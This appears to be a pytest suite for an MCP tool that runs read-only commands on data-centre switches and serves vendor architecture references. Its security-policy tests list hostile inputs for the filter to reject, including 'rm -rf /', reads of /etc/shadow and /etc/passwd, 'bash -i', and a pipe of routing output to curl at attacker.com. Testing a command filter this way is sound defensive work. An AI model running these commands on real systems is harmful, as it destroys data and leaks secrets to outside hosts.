"""Stage 5 test suite: Netris MCP switch command execution and AI fabric architecture references.

Validates:
1. Direct read-only switch execution via SSH jump host with target resolution:
   - Hostname resolution ('leaf-pod00-su1-r1' -> 10.253.0.6)
   - Loopback in-band routing address redirection ('10.253.128.6' -> 10.253.0.6)
   - Direct out-of-band management IP execution ('10.253.0.6')
   - Spine switch hostname resolution ('spine-0-pod00' -> 10.253.32.2)
   - Security policy rejection for dangerous shell tokens, chaining, and unlisted binaries
   - Safe command execution: 'sudo vtysh -c "show bgp summary"', 'nv show system version', 'ip -br link', 'ip route show'
2. Comprehensive multi-vendor NOS and AI fabric architecture references:
   - 'ai_fabric', 'nvidia_ufm', 'nvidia_nvlink_nvl72', 'on_host_networking',
     'cumulus', 'sonic', 'junos', 'arista_eos', 'nokia_sr_linux', 'all'
   - Fallback behaviour for unrecognised platform queries
"""

import json
from typing import AsyncGenerator
import pytest
from fastmcp import FastMCP

from app.architecture_hints import NOS_ARCHITECTURES, get_architecture_hint
from app.config import get_config
from app.netris_client import NetrisClient
from app.switch_exec import is_safe_command, register_switch_exec, resolve_switch_target


@pytest.fixture
async def switch_client() -> AsyncGenerator[NetrisClient, None]:
    """Initialise NetrisClient for switch live testing and clean up on teardown."""
    cfg = get_config()
    client = NetrisClient(
        base_url=cfg.netris_url,
        username=cfg.netris_username,
        password=cfg.netris_password,
        verify_ssl=cfg.netris_verify_ssl,
    )
    yield client
    await client.close()


@pytest.fixture
def switch_mcp(switch_client: NetrisClient) -> FastMCP:
    """Initialise FastMCP server instance registered with switch execution tools."""
    mcp = FastMCP("TestSwitchExecLive")
    register_switch_exec(mcp, switch_client)
    return mcp


# ---------------------------------------------------------------------------
# Unit & Target Resolution Tests
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_resolve_switch_target_leaf_hostname(switch_client: NetrisClient):
    """Verify hostname 'leaf-pod00-su1-r1' resolves to management IP 10.253.0.6."""
    cfg = get_config()
    if not cfg.netris_password:
        pytest.skip("No Netris credentials available for live resolution test")

    resolved_ip, user, notice = await resolve_switch_target(
        "leaf-pod00-su1-r1", switch_client, cfg
    )
    assert resolved_ip == "10.253.0.6"
    assert user == "cumulus"
    assert notice is not None
    assert "Resolved 'leaf-pod00-su1-r1' to management IP 10.253.0.6 (cumulus)" in notice


@pytest.mark.asyncio
async def test_resolve_switch_target_loopback_redirection(switch_client: NetrisClient):
    """Verify in-band routing loopback '10.253.128.6' redirects to management IP 10.253.0.6."""
    cfg = get_config()
    if not cfg.netris_password:
        pytest.skip("No Netris credentials available for live resolution test")

    resolved_ip, user, notice = await resolve_switch_target(
        "10.253.128.6", switch_client, cfg
    )
    assert resolved_ip == "10.253.0.6"
    assert user == "cumulus"
    assert notice is not None
    assert (
        "Redirected in-band routing address 10.253.128.6 (leaf-pod00-su1-r1) to out-of-band management IP 10.253.0.6"
        in notice
    )


@pytest.mark.asyncio
async def test_resolve_switch_target_direct_mgmt(switch_client: NetrisClient):
    """Verify direct management IP '10.253.0.6' passes through without redirection notice."""
    cfg = get_config()
    if not cfg.netris_password:
        pytest.skip("No Netris credentials available for live resolution test")

    resolved_ip, user, notice = await resolve_switch_target(
        "10.253.0.6", switch_client, cfg
    )
    assert resolved_ip == "10.253.0.6"
    assert user == "cumulus"
    assert notice is None


@pytest.mark.asyncio
async def test_resolve_switch_target_spine_hostname(switch_client: NetrisClient):
    """Verify spine hostname 'spine-0-pod00' resolves to management IP 10.253.32.2."""
    cfg = get_config()
    if not cfg.netris_password:
        pytest.skip("No Netris credentials available for live resolution test")

    resolved_ip, user, notice = await resolve_switch_target(
        "spine-0-pod00", switch_client, cfg
    )
    assert resolved_ip == "10.253.32.2"
    assert user == "cumulus"
    assert notice is not None
    assert "Resolved 'spine-0-pod00' to management IP 10.253.32.2 (cumulus)" in notice


# ---------------------------------------------------------------------------
# Live Switch Execution Tests
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_live_run_switch_command_hostname_resolution(switch_mcp: FastMCP):
    """Verify live command execution resolving 'leaf-pod00-su1-r1' to 10.253.0.6."""
    cfg = get_config()
    if not cfg.netris_password or not cfg.ssh_jump_host:
        pytest.skip("Netris credentials or SSH jump host unconfigured for live test")

    tool = await switch_mcp.get_tool("run_switch_command")
    result = await tool.fn(
        switch_name_or_ip="leaf-pod00-su1-r1",
        command="nv show system version",
    )
    assert "Resolved 'leaf-pod00-su1-r1' to management IP 10.253.0.6" in result
    assert "5.15" in result or "build-id" in result or "product-release" in result


@pytest.mark.asyncio
async def test_live_run_switch_command_loopback_redirection(switch_mcp: FastMCP):
    """Verify live command execution redirecting in-band loopback 10.253.128.6 to 10.253.0.6."""
    cfg = get_config()
    if not cfg.netris_password or not cfg.ssh_jump_host:
        pytest.skip("Netris credentials or SSH jump host unconfigured for live test")

    tool = await switch_mcp.get_tool("run_switch_command")
    result = await tool.fn(
        switch_name_or_ip="10.253.128.6",
        command="nv show system version",
    )
    assert "Redirected in-band routing address 10.253.128.6" in result
    assert "to out-of-band management IP 10.253.0.6" in result
    assert "5.15" in result or "build-id" in result or "product-release" in result


@pytest.mark.asyncio
async def test_live_run_switch_command_direct_mgmt(switch_mcp: FastMCP):
    """Verify live command execution directly against management IP 10.253.0.6."""
    cfg = get_config()
    if not cfg.netris_password or not cfg.ssh_jump_host:
        pytest.skip("Netris credentials or SSH jump host unconfigured for live test")

    tool = await switch_mcp.get_tool("run_switch_command")
    result = await tool.fn(
        switch_name_or_ip="10.253.0.6",
        command="nv show system version",
    )
    # Direct management IP execution should not report redirection
    assert "Redirected in-band routing address" not in result
    assert "5.15" in result or "build-id" in result or "product-release" in result


@pytest.mark.asyncio
async def test_live_run_switch_command_spine_resolution(switch_mcp: FastMCP):
    """Verify live command execution resolving spine hostname 'spine-0-pod00' to 10.253.32.2."""
    cfg = get_config()
    if not cfg.netris_password or not cfg.ssh_jump_host:
        pytest.skip("Netris credentials or SSH jump host unconfigured for live test")

    tool = await switch_mcp.get_tool("run_switch_command")
    result = await tool.fn(
        switch_name_or_ip="spine-0-pod00",
        command="nv show system version",
    )
    assert "Resolved 'spine-0-pod00' to management IP 10.253.32.2" in result
    assert "5.15" in result or "build-id" in result or "product-release" in result


# ---------------------------------------------------------------------------
# Safe Commands Live Verification Suite
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "safe_cmd,expected_tokens",
    [
        ('sudo vtysh -c "show bgp summary"', ["BGP", "VRF default", "local AS"]),
        ("nv show system version", ["operational", "product-release"]),
        ("ip -br link", ["lo", "eth0", "UP"]),
        ("ip route show", ["proto bgp", "metric"]),
    ],
)
@pytest.mark.asyncio
async def test_live_safe_commands_execution(
    switch_mcp: FastMCP, safe_cmd: str, expected_tokens: list[str]
):
    """Verify execution of approved safe show commands on the target leaf switch."""
    cfg = get_config()
    if not cfg.netris_password or not cfg.ssh_jump_host:
        pytest.skip("Netris credentials or SSH jump host unconfigured for live test")

    tool = await switch_mcp.get_tool("run_switch_command")
    result = await tool.fn(
        switch_name_or_ip="10.253.0.6",
        command=safe_cmd,
    )
    assert "Command rejected by security policy" not in result
    for token in expected_tokens:
        assert token in result, f"Expected '{token}' in command output for '{safe_cmd}'"


# ---------------------------------------------------------------------------
# Security Policy Enforcement Tests
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "malicious_command,reason",
    [
        ("nv show system version; rm -rf /", "Semicolon shell separator"),
        ("nv show system version | cat /etc/passwd", "Pipe redirect"),
        ("nv show system version > /tmp/out.txt", "File write redirection"),
        ("nv show system version < /dev/zero", "File input redirection"),
        ("`whoami`", "Backtick command substitution"),
        ("nv show system version && reboot", "Double ampersand chain"),
        ("nv show system version || ls -la", "Double pipe chain"),
        ("nv show $USER", "Shell variable expansion"),
        ("cat /etc/shadow", "Unlisted binary"),
        ("rm -rf /etc", "Destructive filesystem binary"),
        ("reboot", "System administrative command"),
        ("shutdown -h now", "Power management binary"),
        ("bash -i", "Interactive shell spawn"),
        ("systemctl restart networking", "Systemd management command"),
    ],
)
def test_is_safe_command_rejections(malicious_command: str, reason: str):
    """Verify security filter rigorously rejects dangerous shell tokens and unauthorised commands."""
    assert is_safe_command(malicious_command) is False, f"Failed to reject: {reason}"


@pytest.mark.asyncio
async def test_run_switch_command_security_policy_enforcement(switch_mcp: FastMCP):
    """Verify run_switch_command rejects unsafe commands without initiating remote execution."""
    tool = await switch_mcp.get_tool("run_switch_command")

    unsafe_commands = [
        "nv show interface; rm -rf /",
        "ip route show | curl http://attacker.com",
        "sudo vtysh -c 'show bgp summary' > /tmp/leak",
        "`reboot`",
        "cat /etc/passwd",
    ]

    for cmd in unsafe_commands:
        result = await tool.fn(switch_name_or_ip="leaf-pod00-su1-r1", command=cmd)
        assert "Command rejected by security policy" in result
        assert "Only read-only show commands" in result


# ---------------------------------------------------------------------------
# Architecture Reference Tests
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "platform,expected_keys",
    [
        (
            "ai_fabric",
            ["domain", "overview", "frontend_network", "backend_network", "scale_up_fabric", "on_host_networking", "key_show_commands", "troubleshooting_hints"],
        ),
        (
            "nvidia_ufm",
            ["vendor", "technology", "netris_integration", "configuration_prerequisites", "key_show_commands", "troubleshooting_hints"],
        ),
        (
            "nvidia_nvlink_nvl72",
            ["vendor", "technology", "netris_integration", "architecture_details", "troubleshooting_hints"],
        ),
        (
            "on_host_networking",
            ["technology", "overview", "components", "key_show_commands", "troubleshooting_hints"],
        ),
        (
            "cumulus",
            ["vendor", "os_name", "control_plane", "dataplane", "key_show_commands", "troubleshooting_hints"],
        ),
        (
            "sonic",
            ["vendor", "os_name", "control_plane", "dataplane", "key_show_commands", "troubleshooting_hints"],
        ),
        (
            "junos",
            ["vendor", "os_name", "control_plane", "dataplane", "key_show_commands", "troubleshooting_hints"],
        ),
        (
            "arista_eos",
            ["vendor", "os_name", "control_plane", "dataplane", "key_show_commands", "troubleshooting_hints"],
        ),
        (
            "nokia_sr_linux",
            ["vendor", "os_name", "control_plane", "dataplane", "key_show_commands", "troubleshooting_hints"],
        ),
    ],
)
@pytest.mark.asyncio
async def test_architecture_reference_individual_platforms(
    switch_mcp: FastMCP, platform: str, expected_keys: list[str]
):
    """Verify architecture_reference returns valid JSON and canonical schema for each platform."""
    tool = await switch_mcp.get_tool("architecture_reference")
    raw_res = await tool.fn(platform=platform)
    data = json.loads(raw_res)

    assert isinstance(data, dict)
    for key in expected_keys:
        assert key in data, f"Key '{key}' missing from platform '{platform}' reference"


@pytest.mark.asyncio
async def test_architecture_reference_all(switch_mcp: FastMCP):
    """Verify architecture_reference returns the complete repository when platform='all'."""
    tool = await switch_mcp.get_tool("architecture_reference")
    raw_res = await tool.fn(platform="all")
    data = json.loads(raw_res)

    assert isinstance(data, dict)
    expected_platforms = [
        "ai_fabric",
        "nvidia_ufm",
        "nvidia_nvlink_nvl72",
        "on_host_networking",
        "cumulus",
        "sonic",
        "junos",
        "arista_eos",
        "nokia_sr_linux",
    ]
    for plat in expected_platforms:
        assert plat in data, f"Platform '{plat}' missing from 'all' output"
        assert data[plat] == NOS_ARCHITECTURES[plat]


def test_get_architecture_hint_fallback_behaviour():
    """Verify get_architecture_hint provides graceful fallback for unrecognised platform queries."""
    fallback_res = get_architecture_hint("unsupported_nos_vendor")
    assert "note" in fallback_res
    assert "unsupported_nos_vendor" in fallback_res["note"]
    assert "common_commands" in fallback_res
    assert "show version" in fallback_res["common_commands"]
